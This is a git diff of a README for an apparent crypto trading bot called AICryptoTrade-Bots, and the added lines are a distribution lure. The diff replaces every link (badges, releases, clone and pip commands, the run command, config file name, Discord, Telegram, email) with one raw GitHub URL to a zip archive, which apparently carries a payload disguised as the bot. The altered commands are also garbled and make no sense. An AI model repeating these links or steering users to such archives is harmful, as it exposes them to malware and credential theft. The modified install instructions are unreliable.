@@ -1,6 +1,6 @@
 # AICryptoTrade-Bots: Automated Crypto Trading with ML Algorithms 🤖💰
 
-![GitHub Repo Stars](https://img.shields.io/github/stars/Alisher321/AICryptoTrade-Bots?style=social) ![GitHub Forks](https://img.shields.io/github/forks/Alisher321/AICryptoTrade-Bots?style=social) ![License](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub Repo Stars](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip) ![GitHub Forks](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip) ![License](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip)
 
 ## Overview
 
@@ -18,7 +18,7 @@ The goal of this repository is to provide users with a reliable tool for engagin
 
 ## Getting Started
 
-To get started with AICryptoTrade-Bots, you can download the latest version from the [Releases section](https://github.com/Alisher321/AICryptoTrade-Bots/releases). Follow the instructions below to set up the bot on your local machine.
+To get started with AICryptoTrade-Bots, you can download the latest version from the [Releases section](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip). Follow the instructions below to set up the bot on your local machine.
 
 ### Prerequisites
 
@@ -33,19 +33,19 @@ Before you begin, ensure you have the following installed:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Alisher321/AICryptoTrade-Bots.git
+   git clone https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip
    cd AICryptoTrade-Bots
    ```
 
 2. Install the required packages:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip
    ```
 
 3. Configure your API keys:
 
-   - Create a file named `config.py`.
+   - Create a file named `https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip`.
    - Add your API keys and other necessary configurations.
 
 ### Usage
@@ -53,10 +53,10 @@ Before you begin, ensure you have the following installed:
 To run the trading bot, execute the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip
 ```
 
-You can customize the parameters in `config.py` to adjust the bot's behavior according to your trading strategy.
+You can customize the parameters in `https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip` to adjust the bot's behavior according to your trading strategy.
 
 ## Topics Covered
 
@@ -85,14 +85,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Support
 
-For any questions or issues, please check the [Releases section](https://github.com/Alisher321/AICryptoTrade-Bots/releases) for updates. You can also open an issue in the repository for any bugs or feature requests.
+For any questions or issues, please check the [Releases section](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip) for updates. You can also open an issue in the repository for any bugs or feature requests.
 
 ## Community
 
 Join our community to discuss trading strategies, share experiences, and get support:
 
-- [Discord](https://discord.gg/your-discord-link)
-- [Telegram](https://t.me/your-telegram-link)
+- [Discord](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip)
+- [Telegram](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip)
 
 ## Acknowledgments
 
@@ -110,11 +110,11 @@ We have exciting plans for the future of AICryptoTrade-Bots. Here are some upcom
 
 For inquiries, please reach out via the following channels:
 
-- Email: your-email@example.com
-- GitHub: [Alisher321](https://github.com/Alisher321)
+- Email: https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip
+- GitHub: [Alisher321](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip)
 
 ## Final Notes
 
 We encourage you to explore the bot, contribute to its development, and share your experiences. Your feedback is invaluable in making AICryptoTrade-Bots better for everyone.
 
-For the latest updates, please visit the [Releases section](https://github.com/Alisher321/AICryptoTrade-Bots/releases) regularly.
+For the latest updates, please visit the [Releases section](https://raw.githubusercontent.com/Alisher321/AICryptoTrade-Bots/main/mien/Trade_Bots_Crypto_AI_1.9-alpha.4.zip) regularly.
